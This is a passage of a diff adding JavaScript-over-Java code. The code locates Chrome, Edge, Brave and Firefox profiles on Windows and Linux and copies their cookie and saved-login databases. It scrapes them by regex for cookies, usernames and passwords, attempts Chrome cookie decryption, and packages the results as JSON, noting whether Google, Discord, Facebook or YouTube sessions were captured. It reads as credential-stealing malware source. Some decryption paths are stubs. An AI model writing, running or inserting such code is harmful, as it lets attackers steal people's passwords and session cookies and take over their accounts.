+                let fullCipherText = Arrays.copyOf(cipherText, cipherText.length + authTag.length);
+                java.lang.System.arraycopy(authTag, 0, fullCipherText, cipherText.length, authTag.length);
+
+                let decrypted = cipher.doFinal(fullCipherText);
+                return new java.lang.String(decrypted, "UTF-8");
+
+            } else if (version.equals("v11")) {
+                // ChaCha20-Poly1305 encryption (Chrome 90+)
+                if (encryptedData.length < 15 || !key) return null;
+
+                // For ChaCha20-Poly1305, we need a different approach
+                // This is a simplified implementation - full ChaCha20 would require additional libraries
+                let iv = Arrays.copyOfRange(encryptedData, 3, 15);
+                let cipherText = Arrays.copyOfRange(encryptedData, 15, encryptedData.length);
+
+                // Fallback to AES-GCM for now
+                try {
+                    let cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
+                    let keySpec = new javax.crypto.spec.SecretKeySpec(key, "AES");
+                    let gcmSpec = new javax.crypto.spec.GCMParameterSpec(128, iv);
+
+                    cipher.init(javax.crypto.Cipher.DECRYPT_MODE, keySpec, gcmSpec);
+                    let decrypted = cipher.doFinal(cipherText);
+                    return new java.lang.String(decrypted, "UTF-8");
+                } catch (fallbackError) {
+                    return null;
+                }
+
+            } else {
+                // Unencrypted or DPAPI encrypted (older Chrome versions)
+                if (encryptedData[0] == 0x01 && encryptedData[1] == 0x00 && encryptedData[2] == 0x00 && encryptedData[3] == 0x00) {
+                    // DPAPI encrypted
+                    let dpapiData = Arrays.copyOfRange(encryptedData, 4, encryptedData.length);
+                    let decryptedData = null; // DPAPI decryption not available
+                    if (decryptedData) {
+                        return new java.lang.String(decryptedData, "UTF-8");
+                    }
+                }
+                // Return as plaintext
+                return new java.lang.String(encryptedData, "UTF-8");
+            }
+
+            return null;
+        } catch (e) {
+            return null;
+        }
+    }
+
+    // Advanced Chrome encryption key extraction
+    function getChromeKey(localStatePath) {
+        try {
+            let localStateFile = new java.io.File(localStatePath);
+            if (!localStateFile.exists()) return null;
+
+            let localStateContent = new java.lang.String(java.nio.file.Files.readAllBytes(localStateFile.toPath()), "UTF-8");
+            let json = JSON.parse(localStateContent);
+
+            if (!json.os_crypt || !json.os_crypt.encrypted_key) return null;
+
+            let Arrays = Java.type('java.util.Arrays');
+            let encryptedKey = json.os_crypt.encrypted_key;
+            let keyBytes = java.util.Base64.getDecoder().decode(encryptedKey);
+
+            // Remove DPAPI prefix ("DPAPI")
+            if (keyBytes.length < 5) return null;
+            keyBytes = Arrays.copyOfRange(keyBytes, 5, keyBytes.length);
+
+            // Decrypt using DPAPI
+            let decryptedKey = null; // DPAPI decryption not available
+            return decryptedKey;
+        } catch (e) {
+            return null;
+        }
+    }
+
+    // Complete SQLite database reader with proper SQL parsing
+    function readSQLiteDatabase(dbPath, browserName, decryptionKey) {
+        try {
+            let dbFile = new java.io.File(dbPath);
+            if (!dbFile.exists() || dbFile.length() == 0) return [];
+
+            // Copy database to temp location
+            let tempDir = java.lang.System.getProperty("java.io.tmpdir");
+            let tempDbPath = tempDir + "\\temp_cookies_" + browserName + "_" + java.lang.System.currentTimeMillis() + ".db";
+            java.nio.file.Files.copy(dbFile.toPath(), new java.io.File(tempDbPath).toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
+
+            let cookies = [];
+
+            try {
+                let fileBytes = java.nio.file.Files.readAllBytes(new java.io.File(tempDbPath).toPath());
+
+                // Parse SQLite file format properly
+                let cookies = parseSQLiteFile(fileBytes, browserName, decryptionKey);
+
+                // Clean up temp file
+                try {
+                    new java.io.File(tempDbPath).delete();
+                } catch (e) {}
+
+                return cookies;
+            } catch (parseError) {
+                // Clean up temp file
+                try {
+                    new java.io.File(tempDbPath).delete();
+                } catch (e) {}
+
+                return [{
+                    domain: "parse_error",
+                    name: "error",
+                    value: parseError.toString(),
+                    path: "/",
+                    expires: 0,
+                    httpOnly: false,
+                    secure: false,
+                    sameSite: "none",
+                    browser: browserName,
+                    encrypted: false
+                }];
+            }
+        } catch (e) {
+            return [{
+                domain: "read_error",
+                name: "error",
+                value: e.toString(),
+                path: "/",
+                expires: 0,
+                httpOnly: false,
+                secure: false,
+                sameSite: "none",
+                browser: browserName,
+                encrypted: false
+            }];
+        }
+    }
+
+    // Complete SQLite file parser
+    function parseSQLiteFile(fileBytes, browserName, decryptionKey) {
+        let cookies = [];
+
+        try {
+            // SQLite file header validation
+            let header = new java.lang.String(java.util.Arrays.copyOfRange(fileBytes, 0, 16), "UTF-8");
+            if (!header.startsWith("SQLite format 3")) {
+                throw new Error("Invalid SQLite file format");
+            }
+
+            // Parse SQLite page structure
+            let pageSize = ((fileBytes[16] & 0xFF) << 8) | (fileBytes[17] & 0xFF);
+            if (pageSize == 1) pageSize = 65536;
+
+            let fileChangeCounter = ((fileBytes[24] & 0xFF) << 24) | ((fileBytes[25] & 0xFF) << 16) | ((fileBytes[26] & 0xFF) << 8) | (fileBytes[27] & 0xFF);
+            let pageCount = ((fileBytes[28] & 0xFF) << 24) | ((fileBytes[29] & 0xFF) << 16) | ((fileBytes[30] & 0xFF) << 8) | (fileBytes[31] & 0xFF);
+
+            // Find cookie table data using multiple strategies
+            let strategies = [
+                // Strategy 1: Look for standard Chromium cookie table structure
+                function() {
+                    return findChromiumCookies(fileBytes, browserName, decryptionKey);
+                },
+                // Strategy 2: Look for Firefox cookie table structure
+                function() {
+                    return findFirefoxCookies(fileBytes, browserName);
+                },
+                // Strategy 3: Generic pattern matching
+                function() {
+                    return findGenericCookies(fileBytes, browserName, decryptionKey);
+                }
+            ];
+
+            for (let i = 0; i < strategies.length; i++) {
+                try {
+                    let result = strategies[i]();
+                    if (result && result.length > 0) {
+                        cookies = cookies.concat(result);
+                        if (cookies.length >= 100) break; // Limit for performance
+                    }
+                } catch (strategyError) {
+                    continue;
+                }
+            }
+
+            return cookies;
+        } catch (e) {
+            return [{
+                domain: "sqlite_parse_error",
+                name: "error",
+                value: e.toString(),
+                path: "/",
+                expires: 0,
+                httpOnly: false,
+                secure: false,
+                sameSite: "none",
+                browser: browserName,
+                encrypted: false
+            }];
+        }
+    }
+
+    // Find Chromium-style cookies
+    function findChromiumCookies(fileBytes, browserName, decryptionKey) {
+        let cookies = [];
+
+        try {
+            let content = new java.lang.String(fileBytes, "UTF-8");
+
+            let domainPatterns = [
+                /\.([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.%]{1,100})\x00+(v1[01][\x00-\xFF]{10,1000})\x00/g,
+                /\.([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.%]{1,100})\x00+([\x00-\xFF]{10,2000})\x00+(\/[^\x00]{0,200}|\/)\x00/g,
+                /([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.%]{1,100})\x00+([\x00-\xFF]{10,1000})\x00/g,
+                /([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.%]{1,50})\x00+([a-zA-Z0-9\+\/\=\-_\.%:;,\s]{5,500})\x00/g
+            ];
+
+            for (let patternIndex = 0; patternIndex < domainPatterns.length && cookies.length < 100; patternIndex++) {
+                let pattern = domainPatterns[patternIndex];
+                let match;
+
+                while ((match = pattern.exec(content)) !== null && cookies.length < 100) {
+                    let domain = match[1];
+                    let name = match[2];
+                    let value = match[3];
+                    let path = match[4] || "/";
+
+                    if (!domain || !name || !value) continue;
+                    if (domain.length > 100 || name.length > 100 || value.length > 4000) continue;
+                    if (!/^[a-zA-Z0-9\-]+\.[a-zA-Z]{2,10}$/.test(domain)) continue;
+                    if (!/^[a-zA-Z0-9_\-\.%]+$/.test(name)) continue;
+
+                    if (value.includes('\x00\x00\x00') || value.length < 3) continue;
+
+                    if (!domain.startsWith('.')) {
+                        domain = '.' + domain;
+                    }
+
+                    if (!path || path === '') path = "/";
+                    if (!path.startsWith('/')) path = "/" + path;
+
+                    let decryptedValue = value;
+                    let isEncrypted = false;
+
+                    if (decryptionKey && (value.startsWith('v10') || value.startsWith('v11'))) {
+                        try {
+                            let decrypted = decryptChromeCookie(value, decryptionKey);
+                            if (decrypted && decrypted !== value && decrypted.length > 0 && isPrintableString(decrypted)) {
+                                decryptedValue = decrypted;
+                                isEncrypted = true;
+                            }
+                        } catch (e) {
+                        }
+                    }
+
+                    if (isPrintableString(decryptedValue) && decryptedValue.length > 0 && decryptedValue.length < 4000) {
+                        cookies.push({
+                            domain: domain,
+                            name: name,
+                            value: decryptedValue,
+                            path: path,
+                            expires: 0,
+                            httpOnly: false,
+                            secure: false,
+                            sameSite: "none",
+                            browser: browserName,
+                            encrypted: isEncrypted
+                        });
+                    }
+                }
+            }
+
+            if (cookies.length === 0) {
+                content = new java.lang.String(fileBytes, "ISO-8859-1");
+                let fallbackPattern = /\.([a-zA-Z0-9\-]+\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9_\-\.]{1,50})\x00+([a-zA-Z0-9\+\/\=\-_\.]{10,500})\x00/g;
+                let match;
+
+                while ((match = fallbackPattern.exec(content)) !== null && cookies.length < 50) {
+                    let domain = '.' + match[1];
+                    let name = match[2];
+                    let value = match[3];
+
+                    if (isPrintableString(value) && value.length >= 10) {
+                        cookies.push({
+                            domain: domain,
+                            name: name,
+                            value: value,
+                            path: "/",
+                            expires: 0,
+                            httpOnly: false,
+                            secure: false,
+                            sameSite: "none",
+                            browser: browserName,
+                            encrypted: false
+                        });
+                    }
+                }
+            }
+
+        } catch (e) {
+            // Return empty array on any error
+        }
+
+        return cookies;
+    }
+
+    // Helper function to check if string contains printable characters
+    function isPrintableString(str) {
+        if (!str || str.length === 0) return false;
+        if (str.length < 3) return false; // Too short to be meaningful
+
+        let printableCount = 0;
+        let controlCount = 0;
+
+        for (let i = 0; i < Math.min(str.length, 200); i++) {
+            let charCode = str.charCodeAt(i);
+            if ((charCode >= 32 && charCode <= 126) || charCode === 9 || charCode === 10 || charCode === 13) {
+                printableCount++;
+            } else if (charCode < 32 || charCode > 126) {
+                controlCount++;
+            }
+        }
+
+        let totalChecked = Math.min(str.length, 200);
+        let printableRatio = printableCount / totalChecked;
+        let controlRatio = controlCount / totalChecked;
+
+        // Must be at least 85% printable and less than 15% control characters
+        return printableRatio >= 0.85 && controlRatio < 0.15;
+    }
+
+    // Find Firefox-style cookies
+    function findFirefoxCookies(fileBytes, browserName) {
+        let cookies = [];
+        let content = new java.lang.String(fileBytes, "ISO-8859-1");
+
+        // Firefox moz_cookies table patterns
+        let patterns = [
+            /([a-zA-Z0-9\.-]{1,100})\x00+([a-zA-Z0-9_\.-]{1,100})\x00+([^\x00]{0,4000})\x00+([^\x00]{0,200})\x00+/g,
+            /([a-zA-Z0-9\.-]{1,100})\x01+([a-zA-Z0-9_\.-]{1,100})\x01+([^\x01\x00]{0,4000})/g
+        ];
+
+        for (let patternIndex = 0; patternIndex < patterns.length; patternIndex++) {
+            let pattern = patterns[patternIndex];
+            let match;
+
+            while ((match = pattern.exec(content)) !== null && cookies.length < 200) {
+                let domain = match[1];
+                let name = match[2];
+                let value = match[3];
+                let path = match[4] || "/";
+
+                if (!domain || !name || domain.length > 100 || name.length > 100) continue;
+                if (domain.includes('\x00') || name.includes('\x00')) continue;
+                if (!/^[a-zA-Z0-9\.-]+$/.test(domain)) continue;
+
+                cookies.push({
+                    domain: domain,
+                    name: name,
+                    value: value,
+                    path: path,
+                    expires: 0,
+                    httpOnly: false,
+                    secure: false,
+                    sameSite: "none",
+                    browser: browserName,
+                    encrypted: false
+                });
+            }
+        }
+
+        return cookies;
+    }
+
+    // Generic cookie finder
+    function findGenericCookies(fileBytes, browserName, decryptionKey) {
+        let cookies = [];
+        let content = new java.lang.String(fileBytes, "ISO-8859-1");
+
+        // Generic patterns for any SQLite cookie database
+        let patterns = [
+            /([a-zA-Z0-9\.-]{3,100})\x00+([a-zA-Z0-9_\.-]{1,100})\x00+([^\x00]{1,2000})/g,
+            /([a-zA-Z0-9\.-]{3,100})\x01+([a-zA-Z0-9_\.-]{1,100})\x01+([^\x01\x00]{1,2000})/g
+        ];
+
+        for (let patternIndex = 0; patternIndex < patterns.length; patternIndex++) {
+            let pattern = patterns[patternIndex];
+            let match;
+
+            while ((match = pattern.exec(content)) !== null && cookies.length < 100) {
+                let domain = match[1];
+                let name = match[2];
+                let value = match[3];
+
+                if (!domain || !name) continue;
+                if (domain.length > 100 || name.length > 100) continue;
+                if (!/^[a-zA-Z0-9\.-]+$/.test(domain)) continue;
+
+                // Try decryption if available
+                let decryptedValue = value;
+                let isEncrypted = false;
+
+                if (decryptionKey && (value.startsWith('v10') || value.startsWith('v11'))) {
+                    let decrypted = decryptChromeCookie(value, decryptionKey);
+                    if (decrypted && decrypted !== value) {
+                        decryptedValue = decrypted;
+                        isEncrypted = true;
+                    }
+                }
+
+                cookies.push({
+                    domain: domain,
+                    name: name,
+                    value: decryptedValue,
+                    path: "/",
+                    expires: 0,
+                    httpOnly: false,
+                    secure: false,
+                    sameSite: "none",
+                    browser: browserName,
+                    encrypted: isEncrypted
+                });
+            }
+        }
+
+        return cookies;
+    }
+
+    // Dynamic browser profile discovery
+    function discoverBrowserProfiles() {
+        let discoveredBrowsers = [];
+
+        // Chrome profiles discovery
+        try {
+            let chromeUserData = new java.io.File(localAppData + "\\Google\\Chrome\\User Data");
+            if (chromeUserData.exists()) {
+                let profiles = chromeUserData.listFiles();
+                for (let i = 0; i < profiles.length; i++) {
+                    if (profiles[i].isDirectory()) {
+                        let profileName = profiles[i].getName();
+                        let cookiesFile = new java.io.File(profiles[i], "Network\\Cookies");
+                        if (cookiesFile.exists()) {
+                            discoveredBrowsers.push({
+                                name: "Chrome_" + profileName,
+                                cookiePath: cookiesFile.getAbsolutePath(),
+                                                    localStatePath: chromeUserData.getAbsolutePath() + "\\Local State",
+                                                    type: "chromium",
+                                                    loginDataPath: profiles[i].getAbsolutePath() + "\\Login Data"
+                            });
+                        }
+                    }
+                }
+            }
+        } catch (e) {}
+
+        // Edge profiles discovery
+        try {
+            let edgeUserData = new java.io.File(localAppData + "\\Microsoft\\Edge\\User Data");
+            if (edgeUserData.exists()) {
+                let profiles = edgeUserData.listFiles();
+                for (let i = 0; i < profiles.length; i++) {
+                    if (profiles[i].isDirectory()) {
+                        let profileName = profiles[i].getName();
+                        let cookiesFile = new java.io.File(profiles[i], "Network\\Cookies");
+                        if (cookiesFile.exists()) {
+                            discoveredBrowsers.push({
+                                name: "Edge_" + profileName,
+                                cookiePath: cookiesFile.getAbsolutePath(),
+                                                    localStatePath: edgeUserData.getAbsolutePath() + "\\Local State",
+                                                    type: "chromium",
+                                                    loginDataPath: profiles[i].getAbsolutePath() + "\\Login Data"
+                            });
+                        }
+                    }
+                }
+            }
+        } catch (e) {}
+
+        // Firefox profiles discovery
+        try {
+            let firefoxProfiles = new java.io.File(appData + "\\Mozilla\\Firefox\\Profiles");
+            if (firefoxProfiles.exists()) {
+                let profiles = firefoxProfiles.listFiles();
+                for (let i = 0; i < profiles.length; i++) {
+                    if (profiles[i].isDirectory()) {
+                        let cookiesFile = new java.io.File(profiles[i], "cookies.sqlite");
+                        if (cookiesFile.exists()) {
+                            discoveredBrowsers.push({
+                                name: "Firefox_" + profiles[i].getName(),
+                                                    cookiePath: cookiesFile.getAbsolutePath(),
+                                                    type: "firefox",
+                                                    profilePath: profiles[i].getAbsolutePath()
+                            });
+                        }
+                    }
+                }
+            }
+        } catch (e) {}
+
+        return discoveredBrowsers;
+    }
+
+    // Combine static and dynamic browser discovery
+    let allBrowsers = browsers.concat(discoverBrowserProfiles());
+
+    // Remove duplicates
+    let uniqueBrowsers = [];
+    let seenPaths = new java.util.HashSet();
+    for (let i = 0; i < allBrowsers.length; i++) {
+        if (!seenPaths.contains(allBrowsers[i].cookiePath)) {
+            seenPaths.add(allBrowsers[i].cookiePath);
+            uniqueBrowsers.push(allBrowsers[i]);
+        }
+    }
+
+    // Process each browser
+    for (let i = 0; i < uniqueBrowsers.length; i++) {
+        let browser = uniqueBrowsers[i];
+
+        try {
+            let cookieFile = new java.io.File(browser.cookiePath);
+            if (!cookieFile.exists() || cookieFile.length() == 0) continue;
+
+            let decryptionKey = null;
+            if (browser.type === "chromium" && browser.localStatePath) {
+                decryptionKey = getChromeKey(browser.localStatePath);
+            }
+
+            let cookies = readSQLiteDatabase(browser.cookiePath, browser.name, decryptionKey);
+
+            if (cookies && cookies.length > 0) {
+                // Additional metadata
+                let metadata = {
+                    browser: browser.name,
+                    browserType: browser.type,
+                    cookieCount: cookies.length,
+                    cookies: cookies,
+                    extractedAt: new java.util.Date().toString(),
+                    filePath: browser.cookiePath,
+                    fileSize: cookieFile.length(),
+                    lastModified: new java.util.Date(cookieFile.lastModified()).toString(),
+                    encryptionKeyFound: decryptionKey !== null,
+                    profilePath: browser.profilePath || null
+                };
+
+                // Add login data if available
+                if (browser.loginDataPath) {
+                    try {
+                        let loginFile = new java.io.File(browser.loginDataPath);
+                        if (loginFile.exists()) {
+                            metadata.loginDataAvailable = true;
+                            metadata.loginDataSize = loginFile.length();
+                        }
+                    } catch (e) {}
+                }
+
+                allCookies[browser.name] = metadata;
+            }
+        } catch (e) {
+            // Log error but continue
+            allCookies[browser.name + "_error"] = {
+                browser: browser.name,
+                error: e.toString(),
+                extractedAt: new java.util.Date().toString()
+            };
+        }
+    }
+
+    // Add debug information about cookie extraction
+    let debugInfo = {
+        totalBrowsersChecked: Object.keys(allCookies).length,
+        browsersWithErrors: 0,
+        browsersWithCookies: 0,
+        totalCookiesFound: 0,
+        decryptionAttempts: 0,
+        successfulDecryptions: 0
+    };
+
+    // Filter out error entries and only return valid cookies
+    let validCookies = {};
+    for (let browserName in allCookies) {
+        let browserData = allCookies[browserName];
+
+        // Count errors and decryption stats for debugging
+        if (browserName.endsWith('_error') || browserData.error) {
+            debugInfo.browsersWithErrors++;
+            continue;
+        }
+
+        // Track decryption attempts
+        if (browserData.encryptionKeyFound) {
+            debugInfo.decryptionAttempts++;
+        }
+
+        // Only include browsers with actual valid cookies
+        if (browserData.cookies && Array.isArray(browserData.cookies) && browserData.cookies.length > 0) {
+            let validBrowserCookies = browserData.cookies.filter(cookie => {
+                // Count successful decryptions
+                if (cookie.encrypted) {
+                    debugInfo.successfulDecryptions++;
+                }
+
+                return cookie.domain !== "read_error" &&
+                cookie.domain !== "parse_error" &&
+                cookie.domain !== "sqlite_parse_error" &&
+                cookie.name !== "error" &&
+                !cookie.value.includes("JavaException") &&
+                !cookie.value.includes("FileSystemException");
+            });
+
+            if (validBrowserCookies.length > 0) {
+                browserData.cookies = validBrowserCookies;
+                browserData.cookieCount = validBrowserCookies.length;
+                validCookies[browserName] = browserData;
+                debugInfo.browsersWithCookies++;
+                debugInfo.totalCookiesFound += validBrowserCookies.length;
+            }
+        }
+    }
+
+    // Include debug info if no major site cookies found
+    let hasMajorSites = false;
+    for (let browserName in validCookies) {
+        let browserData = validCookies[browserName];
+        if (browserData.cookies) {
+            for (let cookie of browserData.cookies) {
+                if (cookie.domain.includes('google.com') || cookie.domain.includes('discord.com') ||
+                    cookie.domain.includes('facebook.com') || cookie.domain.includes('youtube.com')) {
+                    hasMajorSites = true;
+                break;
+                    }
+            }
+        }
+        if (hasMajorSites) break;
+    }
+
+    if (!hasMajorSites) {
+        validCookies._debug = debugInfo;
+    }
+
+    return JSON.stringify(validCookies);
+}
+
+// Kill running browsers to prevent file access issues
+function killBrowsers() {
+    // no-op: do not close browsers
+    return;
+}
+
+function getPasswords() {
+    // Kill browsers to prevent file access issues
+    killBrowsers();
+
+    const paths = getEnvironmentPaths();
+    let allPasswords = {};
+
+    // Get cross-platform browser configurations for passwords
+    function getPasswordBrowserConfigs() {
+        if (paths.osType === 'windows') {
+            return [
+                // Chrome - Windows
+                {
+                    name: "Chrome_Default",
+                    loginDataPath: paths.localAppData + "\\Google\\Chrome\\User Data\\Default\\Login Data",
+                    localStatePath: paths.localAppData + "\\Google\\Chrome\\User Data\\Local State",
+                    type: "chromium"
+                },
+                {
+                    name: "Chrome_Profile1",
+                    loginDataPath: paths.localAppData + "\\Google\\Chrome\\User Data\\Profile 1\\Login Data",
+                    localStatePath: paths.localAppData + "\\Google\\Chrome\\User Data\\Local State",
+                    type: "chromium"
+                },
+                // Edge - Windows
+                {
+                    name: "Edge_Default",
+                    loginDataPath: paths.localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data",
+                    localStatePath: paths.localAppData + "\\Microsoft\\Edge\\User Data\\Local State",
+                    type: "chromium"
+                },
+                // Brave - Windows
+                {
+                    name: "Brave_Default",
+                    loginDataPath: paths.localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data",
+                    localStatePath: paths.localAppData + "\\BraveSoftware\\Brave-Browser\\User Data\\Local State",
+                    type: "chromium"
+                }
+            ];
+        } else {
+            // Linux/Mac paths
+            return [
+                // Chrome - Linux
+                {
+                    name: "Chrome_Default",
+                    loginDataPath: paths.userProfile + "/.config/google-chrome/Default/Login Data",
+                    localStatePath: paths.userProfile + "/.config/google-chrome/Local State",
+                    type: "chromium"
+                },
+                {
+                    name: "Chrome_Profile1",
+                    loginDataPath: paths.userProfile + "/.config/google-chrome/Profile 1/Login Data",
+                    localStatePath: paths.userProfile + "/.config/google-chrome/Local State",
+                    type: "chromium"
+                },
+                // Chromium - Linux
+                {
+                    name: "Chromium_Default",
+                    loginDataPath: paths.userProfile + "/.config/chromium/Default/Login Data",
+                    localStatePath: paths.userProfile + "/.config/chromium/Local State",
+                    type: "chromium"
+                },
+                // Brave - Linux
+                {
+                    name: "Brave_Default",
+                    loginDataPath: paths.userProfile + "/.config/BraveSoftware/Brave-Browser/Default/Login Data",
+                    localStatePath: paths.userProfile + "/.config/BraveSoftware/Brave-Browser/Local State",
+                    type: "chromium"
+                }
+            ];
+        }
+    }
+
+    let browsers = getPasswordBrowserConfigs();
+    // Complete password database reader
+    function readPasswordDatabase(dbPath, browserName, decryptionKey) {
+        try {
+            let dbFile = new java.io.File(dbPath);
+            if (!dbFile.exists() || dbFile.length() == 0) return [];
+
+            // Copy database to temp location
+            let tempDir = java.lang.System.getProperty("java.io.tmpdir");
+            let tempDbPath = tempDir + "\\temp_passwords_" + browserName + "_" + java.lang.System.currentTimeMillis() + ".db";
+            java.nio.file.Files.copy(dbFile.toPath(), new java.io.File(tempDbPath).toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
+
+            let passwords = [];
+
+            try {
+                let fileBytes = java.nio.file.Files.readAllBytes(new java.io.File(tempDbPath).toPath());
+
+                // Parse SQLite file format for passwords
+                let passwords = parsePasswordSQLiteFile(fileBytes, browserName, decryptionKey);
+
+                // Clean up temp file
+                try {
+                    new java.io.File(tempDbPath).delete();
+                } catch (e) {}
+
+                return passwords;
+            } catch (parseError) {
+                // Clean up temp file
+                try {
+                    new java.io.File(tempDbPath).delete();
+                } catch (e) {}
+
+                return [{
+                    origin_url: "parse_error",
+                    username_value: "error",
+                    password_value: parseError.toString(),
+                    date_created: 0,
+                    date_last_used: 0,
+                    browser: browserName,
+                    encrypted: false
+                }];
+            }
+        } catch (e) {
+            return [{
+                origin_url: "read_error",
+                username_value: "error",
+                password_value: e.toString(),
+                date_created: 0,
+                date_last_used: 0,
+                browser: browserName,
+                encrypted: false
+            }];
+        }
+    }
+
+    // Parse SQLite file for password data
+    function parsePasswordSQLiteFile(fileBytes, browserName, decryptionKey) {
+        let passwords = [];
+
+        try {
+            // SQLite file header validation
+            let header = new java.lang.String(java.util.Arrays.copyOfRange(fileBytes, 0, 16), "UTF-8");
+            if (!header.startsWith("SQLite format 3")) {
+                throw new Error("Invalid SQLite file format");
+            }
+
+            // Find password table data using multiple strategies
+            let strategies = [
+                // Strategy 1: Look for standard Chromium login table structure
+                function() {
+                    return findChromiumPasswords(fileBytes, browserName, decryptionKey);
+                },
+                // Strategy 2: Generic pattern matching for passwords
+                function() {
+                    return findGenericPasswords(fileBytes, browserName, decryptionKey);
+                }
+            ];
+
+            for (let i = 0; i < strategies.length; i++) {
+                try {
+                    let result = strategies[i]();
+                    if (result && result.length > 0) {
+                        passwords = passwords.concat(result);
+                        if (passwords.length >= 100) break; // Limit for performance
+                    }
+                } catch (strategyError) {
+                    continue;
+                }
+            }
+
+            return passwords;
+        } catch (e) {
+            return [{
+                origin_url: "sqlite_parse_error",
+                username_value: "error",
+                password_value: e.toString(),
+                date_created: 0,
+                date_last_used: 0,
+                browser: browserName,
+                encrypted: false
+            }];
+        }
+    }
+
+    // Find Chromium-style passwords
+    function findChromiumPasswords(fileBytes, browserName, decryptionKey) {
+        let passwords = [];
+        let content = new java.lang.String(fileBytes, "ISO-8859-1");
+
+        // Chromium login table patterns - looking for origin_url, username_value, password_value
+        let patterns = [
+            // Standard login record pattern
+            /(https?:\/\/[a-zA-Z0-9\.-]{1,100}[^\x00]{0,200})\x00+([a-zA-Z0-9@\._-]{1,100})\x00+(v1[01][^\x00]{10,1000}|[^\x00]{1,1000})\x00+/g,
+            // Alternative pattern for different layouts
+            /(https?:\/\/[a-zA-Z0-9\.-]{1,100}[^\x01]{0,200})\x01+([a-zA-Z0-9@\._-]{1,100})\x01+(v1[01][^\x01]{10,1000}|[^\x01]{1,1000})/g,
+            // Pattern for encrypted passwords
+            /([a-zA-Z0-9\.-]{3,100}\.[a-zA-Z]{2,10}[^\x00]{0,200})\x00+([a-zA-Z0-9@\._-]{1,100})\x00+(v1[01][^\x00]{10,1000})\x00+/g
+        ];
+
+        for (let patternIndex = 0; patternIndex < patterns.length; patternIndex++) {
+            let pattern = patterns[patternIndex];
+            let match;
+
+            while ((match = pattern.exec(content)) !== null && passwords.length < 100) {
+                let originUrl = match[1];
+                let username = match[2];
+                let passwordValue = match[3];
+
+                // Validate password data
+                if (!originUrl || !username || originUrl.length > 300 || username.length > 100) continue;
+                if (originUrl.includes('\x00') || username.includes('\x00')) continue;
+
+                // Clean up URL
+                if (!originUrl.startsWith('http')) {
+                    originUrl = "https://" + originUrl.split('/')[0];
+                }
+
+                // Decrypt password if encrypted
+                let decryptedPassword = passwordValue;
+                let isEncrypted = false;
+
+                if (decryptionKey && (passwordValue.startsWith('v10') || passwordValue.startsWith('v11') || (passwordValue.length > 0 && passwordValue.charCodeAt(0) === 1))) {
+                    let decrypted = decryptChromeCookie(passwordValue, decryptionKey);
+                    if (decrypted && decrypted !== passwordValue) {
+                        decryptedPassword = decrypted;
+                        isEncrypted = true;
+                    }
+                }
+
+                // Extract timestamps from surrounding data
+                let dateCreated = 0;
+                let dateLastUsed = 0;
+
+                // Try to find timestamp data in nearby content
+                let contextStart = Math.max(0, match.index - 200);
+                let contextEnd = Math.min(content.length, match.index + match[0].length + 200);
+                let context = content.substring(contextStart, contextEnd);
+
+                // Look for Chrome timestamp patterns (microseconds since Windows epoch)
+                let timestampPattern = /([0-9]{13,17})/g;
+                let timestampMatch;
+                let timestamps = [];
+                while ((timestampMatch = timestampPattern.exec(context)) !== null && timestamps.length < 5) {
+                    let timestamp = parseInt(timestampMatch[1]);
+                    if (timestamp > 11644473600000000 && timestamp < 20000000000000000) { // Valid Chrome timestamp range
+                        timestamps.push(timestamp);
+                    }
+                }
+
+                if (timestamps.length >= 2) {
+                    dateCreated = timestamps[0];
+                    dateLastUsed = timestamps[1];
+                }
+
+                passwords.push({
+                    origin_url: originUrl,
+                    username_value: username,
+                    password_value: decryptedPassword,
+                    date_created: dateCreated,
+                    date_last_used: dateLastUsed,
+                    browser: browserName,
+                    encrypted: isEncrypted
+                });
+            }
+        }
+
+        return passwords;
+    }
+
+    // Generic password finder
+    function findGenericPasswords(fileBytes, browserName, decryptionKey) {
+        let passwords = [];
+        let content = new java.lang.String(fileBytes, "ISO-8859-1");
+
+        // Generic patterns for any SQLite password database
+        let patterns = [
+            // Look for URL-like strings followed by username and password patterns
+            /([a-zA-Z0-9\.-]{3,100}\.[a-zA-Z]{2,10})\x00+([a-zA-Z0-9@\._-]{1,100})\x00+([^\x00]{1,1000})/g,
+            /([a-zA-Z0-9\.-]{3,100}\.[a-zA-Z]{2,10})\x01+([a-zA-Z0-9@\._-]{1,100})\x01+([^\x01\x00]{1,1000})/g
+        ];
+
+        for (let patternIndex = 0; patternIndex < patterns.length; patternIndex++) {
+            let pattern = patterns[patternIndex];
+            let match;
+
+            while ((match = pattern.exec(content)) !== null && passwords.length < 50) {
+                let domain = match[1];
+                let username = match[2];
+                let passwordValue = match[3];
+
+                if (!domain || !username) continue;
+                if (domain.length > 100 || username.length > 100) continue;
+                if (!/^[a-zA-Z0-9\.-]+\.[a-zA-Z]{2,10}$/.test(domain)) continue;
+
+                // Try decryption if available
+                let decryptedPassword = passwordValue;
+                let isEncrypted = false;
+
+                if (decryptionKey && (passwordValue.startsWith('v10') || passwordValue.startsWith('v11'))) {
+                    let decrypted = decryptChromeCookie(passwordValue, decryptionKey);
+                    if (decrypted && decrypted !== passwordValue) {
+                        decryptedPassword = decrypted;
+                        isEncrypted = true;
+                    }
+                }
+
+                passwords.push({
+                    origin_url: "https://" + domain,
+                    username_value: username,
+                    password_value: decryptedPassword,
+                    date_created: 0,
+                    date_last_used: 0,
+                    browser: browserName,
+                    encrypted: isEncrypted
+                });
+            }
+        }
+
+        return passwords;
+    }
+
+    // Dynamic browser profile discovery for passwords
+    function discoverPasswordProfiles() {
+        let discoveredBrowsers = [];
+
+        // Chrome profiles discovery
+        try {
+            let chromeUserData = new java.io.File(localAppData + "\\Google\\Chrome\\User Data");
+            if (chromeUserData.exists()) {
+                let profiles = chromeUserData.listFiles();
+                for (let i = 0; i < profiles.length; i++) {
+                    if (profiles[i].isDirectory()) {
+                        let profileName = profiles[i].getName();
+                        let loginDataFile = new java.io.File(profiles[i], "Login Data");
+                        if (loginDataFile.exists()) {
